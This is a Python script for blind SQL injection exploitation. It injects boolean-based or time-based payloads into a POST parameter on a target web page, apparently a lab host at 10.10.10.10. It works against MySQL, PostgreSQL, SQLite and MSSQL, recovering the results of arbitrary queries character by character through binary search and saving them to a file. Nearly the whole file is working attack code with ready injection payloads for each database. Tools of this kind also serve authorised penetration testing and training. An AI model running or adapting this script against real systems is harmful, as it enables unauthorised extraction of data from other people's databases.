#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import re
import time
import urllib3
import requests
import datetime
import argparse


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# CHANGE THIS #
PRE = "' OR"   # string to put before each payload
POST = '--'    # string to after before each payload
sleep_time = 2 # seconds to sleep in time based SQLi
###############


# CHANGE THIS
def send_req(payload):
    #print(payload)
    params = {}
    cookies = {}
    headers = {}
    data = {'pwn': payload}
    proxies = {}
    # proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
    url = 'http://10.10.10.10/index.php'
    r = requests.post(
        url,
        params=params,
        data=data,
        headers=headers,
        verify=False,
        proxies=proxies,
        allow_redirects=False,
        cookies=cookies
    )
    return r


# printable chars:
# 9, 10, 13, 11, 12
# 32-126
start_char = 9
end_char = 126
# max number of rows
max_row_num = 50
# max row length
max_row_length = 1000
# keep track of the number of requests made
num_queries = 0
# Content-Length in boolean and nanoseconds in time
compare_value = None


def check_if_true(sqlitype, r, time_elapsed):
    if sqlitype == 'time':
        return time_elapsed >= compare_value
    else:
        # checking the content length is good enough for most cases
        return int(r.headers['Content-Length']) == compare_value


class Database():
    def __init__(self):
        self.query = None
        self.q_data = None
        self.leaks = []
        self.substring = ''
        self.ascii = ''
        self.version_query = ''
        self.db_name = ''
        self.type = ''

    def set_type(self, sqli_type):
        self.type = sqli_type

    def select_row(self, row_num):
        pass

    def add_sleep(self, query):
        pass

    def value_larger_than(self, query, number):
        pass

    def num_rows_larger_than(self, number):
        pass

    def set_compare_value(self):
        global compare_value
        test_query = f'{PRE} (select 1)=1 {POST}'
        measurements = []
        if self.type == 'time':
            # this can be probably be done better
            for i in range(10):
                start = time.time_ns()
                send_req(test_query)
                end = time.time_ns()
                measurements.append(end - start)
            max_value = max(measurements)
            compare_value = max_value + (sleep_time * 1000000000)
            compare_value *= 0.85
        else:
            r = send_req(test_query)
            compare_value = int(r.headers['Content-Length'])

    def query_equals_true(self, payload):
        global num_queries
        num_queries += 1
        if self.type == 'time':
            payload = self.add_sleep(payload)
        payload = f'{PRE} {payload} {POST}'
        start = time.time_ns()
        r = send_req(payload)
        end = time.time_ns()
        time_elapsed = end - start
        return check_if_true(self.type, r, time_elapsed)

    def parse_query(self):
        parsed = {}
        # get the selection
        match = re.search(r'select (.+?)( from|$)', self.query, re.IGNORECASE)
        if match is None:
            exit('The query needs to start with SELECT')
        parsed['selection'] = match.group(1).strip()
        # get the name of the column
        match = re.search(r'.*? as (\w+)', parsed['selection'], re.IGNORECASE)
        if match is not None:
            parsed['col_name'] = match.group(1).strip()
        else:
            match = re.search(r'^[a-zA-Z_][a-zA-Z0-9_]*$', parsed['selection'])
            if match is None:
                print('column name not recognized')
                print('make sure you only include one column')
                print('including an \'as aliasname\' on the target column might help')
                exit()
            parsed['col_name'] = parsed['selection']
        # get the table, if any
        match = re.search(r'select .+? from (.+?)(?: where|$)', self.query, re.IGNORECASE)
        parsed['has_from'] = match is not None
        if parsed['has_from']:
            parsed['table'] = match.group(1).strip()
            # get the where part, if any
            match = re.search(r'select .+? from .+? where (.+)', self.query, re.IGNORECASE)
            parsed['has_where'] = match is not None
            if parsed['has_where']:
                parsed['where'] = match.group(1).strip()
        self.q_data = parsed

    def get_row_length(self, row_num):
        col_name = self.q_data['col_name']

        if self.q_data['has_from']:
            query = self.select_row(row_num)
        else:
            query = self.query

        # check that the query actually returns something
        null_test = f"EXISTS({query})"
        if self.query_equals_true(null_test) is False:
            print('[!] the query did not return any results')
            return 0

        # check the it doesn't return NULL
        null_test = f"1 = (select count(1) from ({query}) as T where {col_name} IS NOT NULL)"
        if self.query_equals_true(null_test) is False:
            print('[!] the query returns NULL')
            return 0

        # get the length of the response
        start = 0
        end = max_row_length  # this could be larger
        while start != end:
            middle = (end + start) // 2
            payload = self.value_larger_than(query, middle)
            if self.query_equals_true(payload):
                start = middle + 1
            else:
                end = middle
        return start

    def get_num_rows(self):
        start = 1
        end = max_row_num  # this could be larger
        while start != end:
            middle = (end + start) // 2
            payload = self.num_rows_larger_than(middle)
            if self.query_equals_true(payload):
                start = middle + 1
            else:
                end = middle
        return start

    def leak_query(self, query):
        if query == '':
            query = self.version_query
        print(f'[i] query: {query}')
        self.query = query
        self.set_compare_value()
        self.parse_query()
        self.leaks = []
        has_table = self.q_data['has_from']
        if has_table:
            num_rows = self.get_num_rows()
        else:
            num_rows = 1
        print(f'[i] number of rows: {num_rows}')
        if num_rows == 0:
            return self.leaks
        try:
            for row_num in range(1, num_rows + 1):
                leak = ''
                length = self.get_row_length(row_num)
                for i in range(1, length + 1):
                    start = start_char
                    end = end_char
                    while start != end:
                        middle = (end + start) // 2
                        if has_table:
                            q = self.select_row(row_num)
                        else:
                            q = self.query
                        payload = f"{self.ascii}({self.substring}(({q}),{i},1))>{middle}"
                        if self.query_equals_true(payload):
                            start = middle + 1
                        else:
                            end = middle
                    leak += chr(start)
                    print(f'[+] leaking row {row_num}: {leak}', end='\r')

                if length > 0:
                    print(f'[+] leaked row {row_num}: {leak}  ')
                    self.leaks.append(leak)
        except KeyboardInterrupt:
            print('')
        return self.leaks


class PostgreSQL(Database):
    def __init__(self):
        super().__init__()
        self.substring = 'substring'
        self.ascii = 'ascii'
        self.version_query = 'select substring(version(),1,10) as leak'
        self.db_name = 'PostgreSQL'

    def select_row(self, row_num):
        return f'{self.query} limit 1 offset {row_num-1}'

    def add_sleep(self, query):
        return f'({query} AND 1=(select 1 from pg_sleep({sleep_time})))'

    def value_larger_than(self, query, number):
        col_name = self.q_data['col_name']
        return f"(select length({col_name}) from ({query}) as T)>{number}"

    def num_rows_larger_than(self, number):
        return f'(select count(*) from ({self.query}) as T)>{number}'


class MySQL(Database):
    def __init__(self):
        super().__init__()
        self.substring = 'mid'
        self.ascii = 'ascii'
        self.version_query = 'select version() as leak'
        self.db_name = 'MySQL'

    def select_row(self, row_num):
        return f'{self.query} limit {row_num-1},1'

    def add_sleep(self, query):
        return f'if({query},sleep({sleep_time}),0)'

    def value_larger_than(self, query, number):
        col_name = self.q_data['col_name']
        return f"(select length({col_name}) from ({query}) as T)>{number}"

    def num_rows_larger_than(self, number):
        return f'(select count(*) from ({self.query}) as T)>{number}'


class SQLite(Database):
    def __init__(self):
        super().__init__()
        self.substring = 'substr'
        self.ascii = 'unicode'
        self.version_query = 'select sqlite_version() as leak'
        self.db_name = 'SQLite'

    def select_row(self, row_num):
        return f'{self.query} limit {row_num-1},1'

    def add_sleep(self, query):
        return f'{query} and 1=LIKE(\'ABCDEFG\',UPPER(HEX(RANDOMBLOB({sleep_time}00000000/2))))'

    def value_larger_than(self, query, number):
        col_name = self.q_data['col_name']
        return f"(select length({col_name}) from ({query}) as T)>{number}"

    def num_rows_larger_than(self, number):
        return f'(select count(*) from ({self.query}) as T)>{number}'


class MSSQL(Database):
    def __init__(self):
        super().__init__()
        self.substring = 'substring'
        self.ascii = 'unicode'
        self.version_query = 'select substring(@@version,1,20) as leak'
        self.db_name = 'MSSQL'

    def select_row(self, row_num):
        col_name = self.q_data['col_name']
        table = self.q_data['table']
        where_added = f"{col_name} not in (select top {row_num} {col_name} from {table} order by {col_name}) order by {col_name}"
        if self.q_data['has_where']:
            original_where = self.q_data['where']
            where = f"({original_where}) and {where_added}"
        else:
            where = where_added
        selection = self.q_data['selection']
        table = self.q_data['table']
        return f"select top 1 {selection} from {table} where {where}"

    def add_sleep(self, query):
        exit('Time based SQLi for MSSQL is not supported!')

    def value_larger_than(self, query, number):
        return f'UNICODE(SUBSTRING(({query}),{number},1))>1'

    def num_rows_larger_than(self, number):
        query = self.query.replace(self.q_data['selection'], 'count(*)')
        return f'({query})>{number}'


def save_leak(output, query, leak):
    if len(leak) > 0:
        with open(output, 'a') as f:
            f.write(f'{query}\n')
            for i, entry in enumerate(leak):
                f.write(f'row {i+1}: {entry}\n')
            f.write('\n')
        print(f'[+] saved all rows in {output}')


def main(db_type, sqli_type, query, output):
    print('\033[1m\033[94mBlind SQL injection script\033[0m\033[0m\n')

    if db_type == 'postgresql':
        db = PostgreSQL()
    elif db_type == 'mysql':
        db = MySQL()
    elif db_type == 'sqlite':
        db = SQLite()
    elif db_type == 'mssql':
        db = MSSQL()

    db.set_type(sqli_type)

    print(f'[i] exploiting a {sqli_type} based SQL injection on {db.db_name}')

    start = time.time()

    # exploit!
    leak = db.leak_query(query)
    save_leak(output, query, leak)

    end = time.time()
    run_time = str(datetime.timedelta(seconds=round(end-start)))

    print(f'[i] completed after {num_queries} requests in {run_time}')


if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser(description='MySQLi, a blind SQL injection script')
        parser.add_argument(
            '-q',
            '--query',
            dest='query',
            metavar='"SELECT foo FROM bar"',
            help='The SQL query to leak',
            default='')
        parser.add_argument(
            '-db',
            '--database',
            dest='db',
            help='Database type',
            choices=['mysql', 'sqlite', 'mssql', 'postgresql'],
            required=True)
        parser.add_argument(
            '-t',
            '--type',
            dest='type',
            help='SQL injection type',
            choices=['time', 'boolean'],
            required=True)
        parser.add_argument('-o',
            '--output',
            dest='output',
            metavar='output.txt',
            help='Filename to save the output',
            default='output.txt')
        args = parser.parse_args()

        if args.db == 'mssql' and args.type == 'time':
            exit('MSSQL only supports boolean based SQLi, sorry!')

        main(args.db, args.type, args.query, args.output)
    except KeyboardInterrupt:
        print('')

